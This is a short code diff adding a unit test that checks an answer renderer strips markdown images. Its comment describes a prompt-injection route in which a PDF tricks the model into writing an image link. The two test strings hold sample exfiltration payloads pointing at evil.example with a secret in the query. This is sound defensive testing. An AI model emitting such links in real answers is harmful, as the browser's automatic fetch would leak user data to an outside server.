@@ -39,5 +39,15 @@ def test_escapes_dollar_amounts():
     assert render_answer(raw) == r"free cash flow of \$71m and adjusted EBITDA of \$313m"
 
 
+def test_images_in_answers_are_not_rendered():
+    # The browser fetches a markdown image by itself, so a PDF that tricks the
+    # model into writing one could send data to another server with no click.
+    for answer in [
+        "Revenue grew. ![](https://evil.example/?q=secret)",
+        "Revenue grew. ![chart][ref]\n\n[ref]: https://evil.example/?q=secret",
+    ]:
+        assert "![" not in render_answer(answer)
+
+
 def test_escaping_leaves_other_text_untouched():
     assert render_answer("no currency here") == "no currency here"
